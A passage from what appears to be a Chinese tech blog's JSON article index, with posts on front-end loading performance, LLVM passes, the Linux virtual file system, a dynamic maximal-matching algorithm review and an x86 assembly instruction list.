前者说明，loading图（以下简称菊花）是必要的。人处于“开始转移注意力”时，这朵菊花就开始挽留你躁动的心。但web工程师的一个使命，就是通过提升性能，不让用户看到菊花。菊花要有，但不能常有，真是一朵磨人的小妖精… 后者说明，资源的加载和渲染可以大做文章。因为一个html文件，几乎是所有资源的承载器，哪些优先加载","text":"前言 关于web性能，有两个著名论断： 0.1-0.2s 用户认为是即时的；1-5s 用户觉得自己能与信息流畅地交互；5-10s 用户开始转移注意力——Robert Miller 用户所接受的数据，有80~90%的时间都耗在前端上——Steve Souders 前者说明，loading图（以下简称菊花）是必要的。人处于“开始转移注意力”时，这朵菊花就开始挽留你躁动的心。但web工程师的一个使命，就是通过提升性能，不让用户看到菊花。菊花要有，但不能常有，真是一朵磨人的小妖精… 后者说明，资源的加载和渲染可以大做文章。因为一个html文件，几乎是所有资源的承载器，哪些优先加载，怎样加载，都是前端工程师可以控制的。 再议减少HTTP请求 “尽量减少HTTP请求，减少DNS查找”这是Yslow写在最前面的两条规则。而放之实际，可能会遇到挑战。为何？因为我们完成了“降低请求数”的目标，但可能损失了其他方面的指标。 a. 没有浏览器缓存 减少HTTP请求，很常用的做法就是把js和css资源inline到html里。这样的做法，自然没有浏览器缓存，重复加载时连静态资源也必须加载。也许有人又说，我可以把整个html文件都缓存啊！的确可以，但以web开发的更新速度，html文件一般都不设或设置很短时间（5 min?）缓存。另外在web2.0时代里，html缓存会带来不必要的问题。比如登录前后，页面资源展示不一样，那么我们就得慎用html缓存。 b. 没有cdn缓存 这个很好理解，任何的内联资源，由于依赖于html，都必须从源服务器而不是cdn服务器返回。 c. 不能按需加载 为了按需加载，前端工程师可谓想法各异，天马行空。比如图片的lazyload技术，异步加载js脚本，而inline的方式恰恰将一切想法摁回脑中。 d. 浏览器预解析DNS失效 现代浏览器有预解析DNS技术。简单来说，就是页面下载到浏览器时，先扫描一遍，在这时发现域名并预解析DNS。这样的前置解析跟dom渲染等操作同步执行，诚然会使浏览器更快。但如果你的html页面因为内联了太多内容（base64图片），大于5M时，浏览器的预解析DNS将会失效。 最佳实践 因而，我们时常像那只捡芝麻丢西瓜的熊。如此平衡这两者呢，业界给我们两个很好的案例。 Demo1 必应 首次内联CSS与JS 将资源取出，并保存在localStorage中 资源名（版本）保存在cookie中 后续请求中，服务器检查对应的cookie 根据cookie的值，只嵌入新的脚本 加载时，从localStorage里载入资源 Demo2 百度(移动端) 首次将静态资源打包，用jsonp统一返回 将资源解析并保存在localStorage中 再次访问时检查localStorage中资源情况 如有缺失再发请求获取资源 必应的做法确保了首次的http请求最少，后续充分发挥增量更新（当然粒度还是文件）的优势提高性能，但缺点是cookie并不可靠。百度则是把首次静态资源的http请求降低到一次，非常暴力的把全部css，js打包成字符串，以jsonp返回。宁愿用str转obj的解析时间去换取加载时间。而随V8引擎的强大，这点解析的时间也将越来越不值得提起。总而言之，这两个Demo都把http请求尽可能的降低，而后都利用了本地存储去获得资源。 我有时候会想起那把由无名的铁匠用三个小时粗制而成的小李飞刀。 你得对技术怀敬畏之心。因为那些谁都懂的技术，在某些人的手里，还真能变出花儿来。 本文链接： http://www.meng.uno/articles/a7561c66/ 欢迎转载！","categories":[{"name":"web","slug":"web","permalink":"http://www.meng.uno/categories/web/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://www.meng.uno/tags/前端/"},{"name":"html5","slug":"html5","permalink":"http://www.meng.uno/tags/html5/"},{"name":"性能","slug":"性能","permalink":"http://www.meng.uno/tags/性能/"}]},{"title":"LLVM与Pass","slug":"llvm","date":"2016-08-11T06:48:40.000Z","updated":"2018-04-10T05:46:42.633Z","comments":true,"path":"articles/c0258bc3/","link":"","permalink":"http://www.meng.uno/articles/c0258bc3/","excerpt":"LLVM简介 传统的编译器，采用的是针对单语言源代码，生成对应平台机器码的方式，类似于： 而LLVM则采用了一种多前端，多后端的方式，如下： 在LLVM当中，LLVM IR是一种low-level的，虚拟指令集。所有的前端语言都能够生成LLVM，从而能够被统一的进行处理。在LLVM当中，还提供了对LLVM IR Optimization进行优化的方式，能够对现有的源码进行搜索，匹配对应的pattern，从而进行指令的替换、修改。 LLVM中，每个过程都是从Pass继承来的，LLVM优化器提供了许多passes，每个都写的很简洁，它们被编译成了库文件，并且在编译的时候被调用。这些库提","text":"LLVM简介 传统的编译器，采用的是针对单语言源代码，生成对应平台机器码的方式，类似于： 而LLVM则采用了一种多前端，多后端的方式，如下： 在LLVM当中，LLVM IR是一种low-level的，虚拟指令集。所有的前端语言都能够生成LLVM，从而能够被统一的进行处理。在LLVM当中，还提供了对LLVM IR Optimization进行优化的方式，能够对现有的源码进行搜索，匹配对应的pattern，从而进行指令的替换、修改。 LLVM中，每个过程都是从Pass继承来的，LLVM优化器提供了许多passes，每个都写的很简洁，它们被编译成了库文件，并且在编译的时候被调用。这些库提供了分析和变换的能力，并且既能独立运作，又能合作。 代码生成 那么LLVM这种“多对多”的编译方式，是如何将LLVM IR转化为机器码的呢？LLVM将代码的生成划分成了多个独立的过程：指令选择、寄存器生成，调度，代码布局优化，生成汇编代码。这样不同的平台，也能够利用自己的优势，对相同的LLVM IR进行优化。 LLVM采用了一种“mix and match”的方式，允许target作者，对于架构做出明确的指示，例如对寄存器的使用、限制做出明确的指示。LLVM利用Target-8description文件来指定对应架构的特性、使用的指令、寄存器。 而LLVM利用tblgen工具从这些.md文件当中，能够读取出足够的信息，并且在instruction selection、register allocator等过程中，选择处理的过程。而.cpp文件，则是实现一些特定的过程，例如浮点指针栈。 LLVM pass LLVM pass完成编译器的变换、优化工作；它们是Pass的子类，根据不同的需要，可以选择去继承ModulePass，CallGraphSCCPass，FunctionPass，或者LoopPass，RegionPass和BasicBlockPass等。 llvm是需要编写、编译、加载和执行的，它相当于一个可以加载的模块。 如果想编写一个模块，可以再llvm/lib/Transform当中创建对应的目录，并且在Transform以及目标文件夹下同时修改两个CMakeLists。在编译时，llvm的编译链会自动生成对应的pass。 pass是基于中间语言llvm IR来进行的。因此它用来对.bc文件进行优化，例如： opt -load /lib/LLVMLbpass.so -lbpass &lt;foo.bc&gt; /dev/null 本文链接： http://www.meng.uno/articles/c0258bc3/ 欢迎转载！","categories":[{"name":"操作系统","slug":"操作系统","permalink":"http://www.meng.uno/categories/操作系统/"}],"tags":[{"name":"LLVM","slug":"LLVM","permalink":"http://www.meng.uno/tags/LLVM/"},{"name":"编译安全","slug":"编译安全","permalink":"http://www.meng.uno/tags/编译安全/"}]},{"title":"Linux文件系统","slug":"linux-file","date":"2016-08-01T08:54:49.000Z","updated":"2018-04-10T05:46:42.632Z","comments":true,"path":"articles/a4b4101b/","link":"","permalink":"http://www.meng.uno/articles/a4b4101b/","excerpt":"虚拟文件系统(VFS)是linux的内核软件层，它能够为各种文件系统提供通用的接口，例如linux，unix，windows系统。它是一个位于应用程序和具体文件之间的中间层。VFS引入了一个通用文件模型，它能够表示所有支持的文件系统，它包含有超级块对象、索引节点对象、文件对象、目录项对象。 超级块对象 super_block存放已安装文件系统的有关信息，对基于磁盘的文件系统，它通常对应于存放在磁盘上的文件系统控制块。对于一个特定的文件系统，超级块的格式是固定的。每一个文件系统都对应一个超级块，它们都会链接到一个超级块链表，而文件系统中的每个文件在打开时都需要在内存分配一个inode结构它们都","text":"虚拟文件系统(VFS)是linux的内核软件层，它能够为各种文件系统提供通用的接口，例如linux，unix，windows系统。它是一个位于应用程序和具体文件之间的中间层。VFS引入了一个通用文件模型，它能够表示所有支持的文件系统，它包含有超级块对象、索引节点对象、文件对象、目录项对象。 超级块对象 super_block存放已安装文件系统的有关信息，对基于磁盘的文件系统，它通常对应于存放在磁盘上的文件系统控制块。对于一个特定的文件系统，超级块的格式是固定的。每一个文件系统都对应一个超级块，它们都会链接到一个超级块链表，而文件系统中的每个文件在打开时都需要在内存分配一个inode结构它们都要链接到超级块。 索引节点对象 文件系统处理文件所需要的所有信息，都放在索引节点的数据结构中。对于每个文件来说，索引节点对文件是唯一的,其数据结构是inode。要访问一个文件时，一定要通过它的索引才知道它是什么类型的文件(inode有一个union包含了这个信息)。inode包含了文件的各种信息。它还包含一个dentry结构的队列，可以通过它找到与这个文件相联系的所有dentry结构，指向超级块的指针等。每个索引节点对象也包含在文件系统的双向循环链表中，这个链表的头保存在超级块对象中。同时，inodes也存放在一个散列表中，用来加快对索引对象的搜索。 文件对象 文件对象用来描述一个进程怎样与一个打开的文件进行交互，它是在文件被打开的时候创建的，由一个file数据结构来描述。其存放的主要信息是文件指针，即文件中当前的位置。使用中的文件对象，包含在超级块所确立的链表中。其中的f_list字段包含了前一个/后一个对象的指针。 目录项对象 VFS把每个目录看作由若干子目录和文件组成的一个普通文件。在目录项被读入内存后，VFS就用一个dentry结构来表示它。对于进程查找路径中的每一个分量，都为其创建一个目录项分量。每个分量都和其对应的索引节点相联系。由于目录项对象可能会经常使用，因此linux使用目录项高速缓存，它包含一个不同状态的目录项对象集合，以及一个用于快速的散列表。 文件操作函数的调用 由于每个文件系统都有其自身的文件操作集合，VFS将inode从磁盘装入内存时，会把文件操作的指针存放在数据结构file_operation中(定义在fs.h中)，而该结构的地址存放在索引节点对象的i_fop字段中。进程打开文件时，VFS就用存放在索引节点中的地址初始化新文件对象的f_op字段，使得后续操作能够继续调用这些文件操作函数。f_op是指向文件操作表的指针。事实上除了file_operations,还有dentry_operations和inode_operations，super_operations，但它们通常只在打开文件的过程中使用，不像file_operations结构中那些函数常用。 进程与文件 已打开的文件，是属于进程的一项“财产”，归具体的进程所有。在进程的task_struct中，包含两个数据结构. struct fs_struct *fs; struct files_struct *files; 其中，fs_struct是关于文件系统的信息，它反映的主要是带有全局性的，对具体进程而言的信息，与具体打开的文件关系不大。fs_struct里面包含有一个指针pwd，它总是指向进程的“当前工作目录”，每当进程进入不同目录时，内核就使进程的pwd指向这个目录在内存中的dentry，而root指针则指向进程的根目录(还有一个altroot，指向“替换跟目录”)。files_struct是关于已打开文件的信息，它的主体是一个file结构数组，每打开一个文件后，进程就通过一个fid来访问这个文件，这个fid实际上就是它在file数组中的下标。 文件系统的安装和拆卸 每当将一个存储设备安装到现有文件系统中的某个节点时，内核都要为之建立一个vfsmount结构，它既包含了该设备的信息，又包含了有关安装点的信息。因此fs_struct中的pwdmnt总是指向一个vfsmount结构。 与传统的Unix内核不同，linuc允许同一个文件系统被安装许多次。对于每个安装操作，内核通过一个vfsmount数据结构来保存安装点和安装标志等信息。这个vfsmount数据结构保存在几个双向循环链表中：父文件系统vfsmount描述符的地址和安装点dentry的地址索引散列表；属于每一命名空间的已安装文件系统描述符形成的双向循环链表；每一个已安装文件系统已安装的文件形成等双向循环链表。 安装普通文件系统 mount系统调用用来安装一个普通文件系统。它的服务例程sys_mount()向下调用了do_mount，并最后由do_kern_mount()函数完成了安装操作的核心。do_kern_mount首先会查找对应的文件系统类型，然后分配一个新的已安装文件系统的描述符mnt，并初始化一个新的超级块(如果get_sb能够在链表中找到对应的超级块对象，说明这个设备被安装了多次，直接返回这个已有超级块的地址)，以及mnt中的一些字段。最后，它会把这个描述符插入到合适的链表中去。在完成这些工作后，该函数将mnt返回。 安装根文件系统 根文件系统的安装与普通文件系统安装是不同的，它是系统初始化的关键部分。它分为两个部分，首先是安装特殊rootfs文件系统，它提供一个作为初始安装点的空目录；随后内核在空目录上安装实际根文件系统。为什么要先安装rootfs？因为它允许内核轻易地改变实际根文件系统，而内核会逐个安装卸载许多个根文件系统。 在rootfs安装阶段，do_kern_mount会调用rootfs_get_sb，为其分配特殊的超级块。随后为进程0分配namespace，将其根目录和当前工作目录设置为根文件系统。 在实际安装阶段，内核调用mount_root函数，在rootfs初始根文件系统中创建设备文件/dev/root。调用sys_chdr(“root”)改变进程的当前目录，然后移动rootfs上的安装文件系统和安装点。而rootfs也并没有被卸载，只是隐藏在根目录下而已。 卸载文件系统 unmount系统调用由来卸载一个文件系统。相应的sys_unmount例程对文件名和一组标志进行处理。首先需要对安装点路径名进行查找，随后调用do_unount，根据标志位进行相应的处理。unmount_tree会卸载文件系统(及其所有子文件系统)。最后，内核会减少相应文件系统根目录的目录项对象和已安装文件系统描述符的引用计数器值。 路径名查找 进程识别一个文件时，需要分析路径名，并且把它拆分成一个文件名序列。首先需要区分这个路径是相对路径还是绝对路径。这个可以通过路径名的第一个字符是否是“/”来确定。绝对路径从进程的根目录开始搜索，否则从进程的当前目录开始搜索。 在这个过程中，内核会检查依次检查序列中的每一项，找到与它匹配的目录项，以获得相应的索引节点；再读取这个索引节点的目录文件，继续检查下去。但这个过程没有想象的那么简单：每个目录的访问权都需要检查，文件名可能是与任意一个路径名对应的符号链接，符号链接会包括循环，查找可能会延伸到其他的文件系统。 路径名查找接受一个文件名指针，一个标志，以及一个nameidata数据结构的地址，这个nameidata存放了查找操作的结果。nameidata中的dentry和mnt分别指向所解析的最后一个路径分量的目录项对象和已安装文件系统对象。 文件打开/读写 文件打开和关闭，核心是对一个fd进行操作。这个fd也就是指向文件对象的指针数组task_struct-&gt;files-&gt;fd中分配给新文件的索引。创建一个新的文件对象，然后将它放在fd数组中。 文件读写是对于文件自身来说的，因此其相关的信息存储在inode中。linux中，对于文件的读写，实际上是对缓冲区直接进行的，而不是直接在文件上操作。对文件的操作由内核中的线程kflushd来完成，它们相当于一道流水线上的两道工序。 本文链接： http://www.meng.uno/articles/a4b4101b/ 欢迎转载！","categories":[{"name":"操作系统","slug":"操作系统","permalink":"http://www.meng.uno/categories/操作系统/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.meng.uno/tags/Linux/"},{"name":"文件系统","slug":"文件系统","permalink":"http://www.meng.uno/tags/文件系统/"}]},{"title":"完全动态最大匹配的简单确定性算法","slug":"biggest-match","date":"2016-07-16T12:40:27.000Z","updated":"2018-02-18T13:25:50.291Z","comments":true,"path":"articles/8e9f2014/","link":"","permalink":"http://www.meng.uno/articles/8e9f2014/","excerpt":"Simple Deterministic Algorithms for Fully Dynamic Maximal Matching 解决的问题 这篇文章介绍了什么是“完全动态最大匹配”，然后介绍了他们提供的在最坏情况下更新时间为平摊O(√m)（m表示图中的边数）时间复杂度、O(n+m)空间复杂度内完成的“3/2-近似最大基数匹配（MCM）”算法。这篇文章是为了处理图论中的“匹配”问题，作者将“图”分成[1]一般图，[2]低荫度[4]图 两种来处理。而对于每种图，处理步骤与方法基本一致，每种图都有——“插入”、“删除”两种操作，所不同的就是每种图所对应的情况（Case）不同而已。 采用的思","text":"Simple Deterministic Algorithms for Fully Dynamic Maximal Matching 解决的问题 这篇文章介绍了什么是“完全动态最大匹配”，然后介绍了他们提供的在最坏情况下更新时间为平摊O(√m)（m表示图中的边数）时间复杂度、O(n+m)空间复杂度内完成的“3/2-近似最大基数匹配（MCM）”算法。这篇文章是为了处理图论中的“匹配”问题，作者将“图”分成[1]一般图，[2]低荫度[4]图 两种来处理。而对于每种图，处理步骤与方法基本一致，每种图都有——“插入”、“删除”两种操作，所不同的就是每种图所对应的情况（Case）不同而已。 采用的思想 这篇算法总体采用了分治的思想在每个小的情况下又有贪心算法的影子，本来“3/2-近似最大基数匹配（MCM）”这个问题相当难解决，而且已知算法中，要么时间复杂度为O(n)，要么为O((n+m)√2/2)而且相当复杂，情况相当多。这篇算法一个很大的优点就是，思路清晰，作者将自己设计算法的思路，无遗地展现在读者面前。说起思路清晰，也就是分的情况条例清晰，也就是我们所说的分治思想。本来一个大问题不好求解，但我们可以通过将其分解为等价的几个小问题分别求解。 就像这篇算法，将“完全动态最大匹配”分为一般图与低荫度图两个部分来分别阐述，让算法在一般情况以及特殊情况都能游刃有余。 在应对每一大类图的各种操作（插入或删除）时，由于仍旧很复杂，所以作者又一次运用分治思想，将他们每个具体的操作继续分解为更小的几种情况，同时做到面面俱到，条理清晰。 在每一个小的情况下，遍历所有情况，找出能使匹配最大的情况，属于贪心的范畴，对于贪心算法，由于每种情况实在所要找的节点较少，所以我也认为贪心是比较不错的选择，而且，我们没必要在这样的小点上过于纠结。 基本算法描述 一般图 定义V={1,2……n}表示图的顶点的集合 为了简单处理，假定√n为整数； 定义G = (G0,G1……)表示图的集合，而且定义G0为空图，Gi由Gi-1得到； 对于每一个时间跨度i,Gi=(V,Ei),mi=|Ei| （m表示图中的边数）。 数据结构 M 存储在AVL树中（支持O(logn)时间复杂度的插入、删除）每个节点v处保存mate(v)返回当前匹配中的邻接顶点； N(v) 存储在AVL树中（v∈V）用于存储节点v的邻接顶点，变量deg(v)存储v的度（无向图）（支持O(logn)时间复杂度的插入、删除以及取出r邻接顶点在O®时间复杂度内）； F(v)（v∈V）用于保存v的自由邻接节点（支持O(1)时间复杂度下的插入、删除以及如果有自由邻接顶点就返回TRUE的has-free(v)操作，O(√n)时间复杂度下的返回任意自由邻接顶点的get-free(v)操作），为了很好的得出F(v)，还另外加了一个长度为n的Boolean型数组来表明当前自由邻接顶点、一个长度为√n的范围在[√nj+1,√n(j+1)]的计数数组来保存位置j处的自由邻接顶点的数目、一个变量来存储总的自由邻接节点数。 一个最大堆Fmax存储所有的以自身的度为权的自由节点（支持O(logn)时间内的插入、删除、update-key、find-max操作）。 具体算法 初始化图后，定义三个不变量，每次程序循环运行结束都不会突破这些不变量： 不变量1：所有节点度不超过√(2m+2n)； 不变量2：在第i次循环变为自由节点的节点度不超过√(2m)； 不变量3：M是最大匹配，而且没有长度为3的增光路径。 然后进行循环，每次循环对边ei进行操作。 插入边ei={u,v}的操作 首先更新相关的数据结构：N(u),N(v),deg(u),deg(v),Fmax以及u、v的值。 然后分如下四种情况讨论： u、v都已匹配，此时无需操作； u、v都是自由节点，这种情况下涉及更新M与Fmax，将u、v从F(x)中移除，花费O(√n+m)时间； u是自由的而v已被匹配，这种境况下，找到最大匹配集M中与v匹配的节点x=mate(v),再找到与x邻接的自由顶点w，如果能找到，则将匹配(x,v)移除，而将（u,v)、(x,w)加入。操作时间也在O(√n+m)内； v是自由的而v已被匹配，这种情况与上一种相对称。 删除边ei={u,v}的操作 删除操作主要分为两种情况： ei ∉ M 唯一要做的事就是，将u从F(v)，v从F(u)中删去； ei∈M 由分为两种情况讨论： deg(u)≤√(2m) 时，我们必须通过aug-path(u)来所搜一条以u为起点的长度为3的增广路径，如果没有找到，那么直接标定v为自由节点即可，如果找到，定义u的自由邻接节点为w，w的邻接顶点为y，y的自由临界顶点为x，将{u,w}和{y,x}添加到匹配中而将{w,y}删除，同样的方法处理v。 deg(u)&gt;√(2m) 时，此时u不能自由，因为它的度太高。保持u匹配，我们通过surrogate(u)来获取u的代替节点，我们称呼为su，改变它的状态为自由，然后像在a)中处理u一样处理su。 对于低荫度图 在这部分中，考虑的是荫度不大于c的图，而c由下式确定： 其中E(U)表示U中的边数。 由于图较稀疏，所以将每条边都带上方向，构成△-方向无向图 数据结构 与一般图基本相同。 具体算法 主要从：定向、插入、删除，几个部分来阐述： 定向 在每一步中，都通过运行算法A，来保证当前图是△-方向的。像如下算法中那样更新F和D，如果有t条边在定向，我们需要O(t)时间。 插入边ei={u,v}的操作 由于出度最多为△，所以插入时间O(△)。 删除边ei={u,v}的操作 未匹配的边被删除没什么可以操作的，但是当匹配的边被删除就有趣了，这里必须找到u(v)的匹配节点，时间复杂度仍为O(△)。 算法分析的结论 分析这个算法，其时间复杂度确实是平摊条件[4]下O(√m)(m表示图的边数)； 其空间复杂度为O(m+n)。 这个算法确实能在最短的时间内的出“3/2-近似最大基数匹配（MCM）”。 用一个例子说明相关算法 为了较好的说明这个算法，我仅就自己画的一个图做些简要的分析，有遗漏之处实属算法没理解透： （图如下，分别由6个顶点、7条边组成，由于算法本身要求图中点、边数目较多，而简短的语言无法描述清楚，所以选择这样一个简单的图来叙述） 以下模拟算法过程：（只举例说明） 由文章知，该算法要处理动态图的最大匹配问题，首先初始化G0为空，我们按e0—e6的顺序向图中添加边，然后删除边。 将e0（AB）加入，直接将此边加入最大匹配M； 将e1（AC）加入，不操作； 将e2（BC）加入，不操作； 将e3（CE）加入，直接将此边加入M； 将e4（BF）加入，不操作； 将e5（EF）加入，不操作； 将e6加入，将此边加入M，同时将e3从M中删除，将e4加入，将e0删除，将e1加入M。 得到如下的最大匹配： 删除边时： （由于删边不容易看出来，所以仅将出现可见变化时的情况列出。） 删除e0，不操作； 删除e1,将e1从最大匹配M中删除； 删除e4，将e2加入M，将e4删除。 得到的匹配如下： 通过以上两个实例（一个删除、一个插入），基本能模拟本文关于动态最大匹配的一般算法。 认识与看法 已有算法的问题所在 算法提到对于低荫度图，给每条边改成有向边处理，然后用贪心算法求解，但是算法并未给出如何判断一个图是否是低荫度图，而且即使有了一个标准，那么当一个图先是低荫度图，后来因为添加一条边之后，成了算法判断的非低荫度图，之后再添加边……如此一来，后面添加边的匹配操作，仍然会按低荫度图处理，这样一来时间复杂度就明显升高了。与此相反，当一个图先是普通图，当减去一条边后，成了低荫度图，再继续减去边……后来虽然形成了低荫度图，但是仍然按普通图来处理的。——我的意思是，当加边/减边（一个更新操作）在普通图与低荫度图之间轮换时，算法会因每次都错开最好情况而用的时间急剧升高。在实际应用中，这种情况应该会很常见，所以我认为这个问题还是相当严峻的。 算法一直在说向图G，但这是一个“抽象”的概念，文中并没有提及这个图是怎么存储的，也没有提及添加/删除边是怎么进行的。我觉得这虽然是不起眼的一部分，但是它实现的好坏，却是后来算法的高效进行与否的保证。（在第四次作业中我将详细分析不同存储结构存储的图的不同之处，以及哪种存储对此算法的实现最有益。） 已有算法可改进之处 算法中提到对点的度按降序排列，但如果两个点的度完全一样，或者所有点的度完全一样时，这样的处理难免有些草率，和普通匹配算法没有这一处理操作的算法过程相似，甚至多了偶尔的不必要交换（当度相同时的交换），于是我想到，能不能通过增加一个标志位来改进交换同时由于考虑到一般情况下，顶点的度有大部分是相同的，所以可以考虑改进一下排序操作，找一个比较稳定的排序是比较好的。 算法用AVL树来存储匹配，这一点感觉是比较好的操作，但是当存储每个点的邻接点时，不仅又用AVL树来存储，而且需要用另外一个变量存储该顶点的度，而且每次插入/删除边（一个更新操作）都可能需要调整AVL树，于是，我想能不能用更好的适用于随机搜索（插入、删除）的数据结构，例如：散列表来存储邻接顶点呢？这样一来，搜索的时间由O(logN)减小到O(1)，空间基本不会增加，反而减少一个整型空间（每个顶点减少一个，共N个），插入/删除边的时间大约也是O(1)，这样一来就比以前的算法要改进了一些（具体实现，见作业四）。 算法中提到用一个数据结构F(v)来存储顶点v的邻接顶点中未匹配的顶点，及其信息。然后算法提到一个长度为n（n表示所有顶点数量）的数组以及一个长度√n的计数数组。这种处理，在原则上是没有什么错误的，但是长度为n或者√n的数组没法实现每次插入顶点时就没法用了，为了实现完全动态匹配，我们需要用一个更好的数据结构来完成这一操作（当然对于本算法，这一改进并没有什么作用，但是想到可以为算法进行拓展，所以这个改进是必要的），我想到的数据结构是动态表——一种最省空间，且扩充/缩减时间O(1)（由摊还分析可证）的数据结构。 当数据量较大，短时间有较多条边需要插入/删除时，（通过插入操作来说明）每次操作，都是先将边加入存储边的数据结构，然后再依次更新其他相邻节点的邻接信息，以及边的信息。最后再分情况（动态规划）依次判断以及做出调整，简单来讲，整个判断过程分为三个部分，而且这三个部分是相互独立的，所以假如有N次插入，那么就有3N步，正常情况（该算法原来描述那样）。在一次插入边的操作结束后，存储边的数据结构便空闲下来，而第二次边的插入还没有开始。中间这部分时间浪费严重（当大数据来临时）。 已有算法不适用之处 算法一开始是通过一个空的数据结构开始插入边，来建立匹配，假如已有一个大数据的图（数据在外存，一般来说数据量过大，没法一次性装入内存）或者，由于数据量过大，没法普通存储（或者为了省空间、减小出错率）而用压缩图来存储，如果仍然用现有的算法来做，是极其困难的。也许可以实现，但是也困难重重，我仅将其归为不适用的一类。 改进意见 针对第一处问题。为了在每一步都使算法做到最优，那么在低荫度图与普通图的转换接口处，就应该更加重视，为了解决这个问题，我觉得，可以在每增加/删除一条边（一个更新操作）时增加一次判断，即：max[|E(U)|/(|U|-1)]&gt;C时，就进行普通图的操作，否则进行低荫度图的操作，其中C为预设的荫度的分界线。同时，首先对普通图的操作，或者对低荫度图的操作，当第一次出现两种图混合时，再初始化另一种图的存储结构，这样一来如果一直是基于两者中一种图的更新操作，就不需要那么大的空间开销。 在原算法，没有这一判断时，相对现在的改进，在每一次更新操作的时间上先是少一步，但当更新操作在多次往往复复地在两种图之间转换时，虽然改进多了一次判断，但是避免了两种图用同一种算法实现的时间消耗，算法改进的正确性及合理性得证。 针对第二处问题。我觉得这里的问题是作者的一个疏忽，当然在这个算法中，选用哪种数据结构来存储图，确实不是那么好选择的。选用邻接矩阵时，虽然边的信息清晰明了，但是，当数据量增大时，空间开销也是挺大的。若选用邻接表，减少了空间开销，但是，当每次统计某个节点的邻接顶点时，显得有些麻烦，邻接多重表，十字链表等弊端就更多与优点了。于是，在此改进中，我仅仅提出“邻接矩阵”与“邻接表”这两种存储图的数据结构来存储这个算法有关的图，这样，相对来说，比其他数据结构要简单，以及开销较小（时间/空间上）。 这两种图的存储结构，都可以实现边的插入/删除在O(1)时间内，并且相对其他存储结构还比较好实现，于是正确性得证。 针对第一处不足。我觉得可以增加一个标志位（整型）来实现对同一个度的不同节点做一下区分，第一次度为某个值的顶点标记为1，以后如果再有和这个点度相同的标记为2，……以此类推，每次为了保证度越高的节点越先匹配，不仅要判断度的大小，同时当度相等时，还要判断标志位，标志位越小（越大也行）就越优先保持匹配。 这一改进，使该算法对多顶点度相等的图，效果明显，当然当顶点度基本都不相同时，这一改进显得一无是处，反而增加空间开销。但就对程序改进角度讲，这样做着实可以在某些情况下，增加算法正确性，减少算法时间复杂性，我觉得这可以作为改进合理性的证明。 针对第二处不足。我觉得可以用散列表来存储每个顶点的邻接点信息，这样一来，可以减少一个整型变量空间，同时使搜索某个点是否与另一个点邻接能够在O(1)时间内完成（这也是散列表的最大的用处）。当然，散列表的构造也有很多方式，这里可以假设之前每个顶点都有一个ID或者有一个单独的可区分的标识。当以顺序ID来标记每个顶点时，可以用直接寻址法；当以单独的可区分标识来标记每个顶点时，可以用数据分析法来确定散列函数。 该改进的正确性，可以通过散列表在搜索上的正确性来证明，同时在空间复杂性上可能比以前算法要多（当然也可能相同），但在搜索时间上，对原有算法改进是十分显著的。由此，改进的合理性由此得证。 针对第三处不足。这一点属于“个人爱好”，为什么这么说呢？因为这一改进对原有算法不会产生一丁点的影响，但是却为程序可拓展性做了一点贡献。用动态表代替原有长度固定的数组，当顶点个数增多时，可以避免每次不够用又重新手动申请空间的弊端。可以说，动态表这一数据结构完美适应了顶点可变的情况，当边减少时，那些独立的顶点，可以通过某种方式，将其删去，以减少空间复杂性，同时，顶点减少，搜索更快；当边增多时，如果某些顶点原来没有记录，再在动态表中将其加入，丝毫不用担心空间分配麻烦问题。 动态表实现简单，效率高，事实上它和普通数组相比基本没有效率损失。我觉得即使是原算法思想（即使没边，也有顶点）也可以用动态表代替数组。 针对第四处不足。当大数据来临时，我将每次的匹配过程看成三部分，这让我想起了《计算机组成原理》中关于指令流水线的介绍，我发现该算法中三部分之间互相无关联，于是，我就想能不能仿照指令流水线的方式，来改进已有算法的三段匹配过程呢？也就是说，当第一条边插入时，我顺序开始执行那三段操作，当执行完第二段时，第二次插入已经可以开始执行了……依次类推，当大量数据进行同一个操作（插入/删除边）时，就可以成倍地减少时间复杂性（将三段融合成一段）。 这一改进符合并行性要求，而且可以证明，原来程序的三段互不影响，那么这个改进就显得在大数据上大有用武之处。 针对第一处不适。由于该算法是每次（动态）加入边，而现实是需要先初始化一个图，而且还可能是大量的数据的图，所以该算法不适用之处就显现出来了。虽然如果将已经存在的大数据图里的边一个个挑出来再加入，可以完成此操作，但是考虑时间将会是特别大的。于是想到，能不能给该算法在加一点能够对静态图匹配的内容，以便其能够在大数据上发挥作用。 如今，数据已进入海量时代，应对大数据冲击，已经成为考验所有算法好坏的一个标准，于是对此算法往大数据上适应，是十分有必要的。 本文链接： http://www.meng.uno/articles/8e9f2014/ 欢迎转载！","categories":[{"name":"算法设计","slug":"算法设计","permalink":"http://www.meng.uno/categories/算法设计/"},{"name":"最大匹配","slug":"算法设计/最大匹配","permalink":"http://www.meng.uno/categories/算法设计/最大匹配/"}],"tags":[{"name":"算法设计","slug":"算法设计","permalink":"http://www.meng.uno/tags/算法设计/"},{"name":"最大匹配","slug":"最大匹配","permalink":"http://www.meng.uno/tags/最大匹配/"},{"name":"确定性算法","slug":"确定性算法","permalink":"http://www.meng.uno/tags/确定性算法/"},{"name":"动态","slug":"动态","permalink":"http://www.meng.uno/tags/动态/"}]},{"title":"汇编指令大全","slug":"asm-func","date":"2016-07-16T12:18:01.000Z","updated":"2018-02-18T13:25:50.290Z","comments":true,"path":"articles/711069a/","link":"","permalink":"http://www.meng.uno/articles/711069a/","excerpt":"数据传输指令 通用数据传送指令 MOV 传送字或字节. MOVSX 先符号扩展,再传送. MOVZX 先零扩展,再传送. PUSH 把字压入堆栈. POP 把字弹出堆栈. PUSHA 把AX,CX,DX,BX,SP,BP,SI,DI依次压入堆栈. POPA 把DI,SI,BP,SP,BX,DX,CX,AX依次弹出堆栈. PUSHAD 把EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI依次压入堆栈. POPAD 把EDI,ESI,EBP,ESP,EBX,EDX,ECX,EAX依次弹出堆栈. BSWAP 交换32位寄存器里字节的顺序 XCHG 交换字或字节.( 至","text":"数据传输指令 通用数据传送指令 MOV 传送字或字节. MOVSX 先符号扩展,再传送. MOVZX 先零扩展,再传送. PUSH 把字压入堆栈. POP 把字弹出堆栈. PUSHA 把AX,CX,DX,BX,SP,BP,SI,DI依次压入堆栈. POPA 把DI,SI,BP,SP,BX,DX,CX,AX依次弹出堆栈. PUSHAD 把EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI依次压入堆栈. POPAD 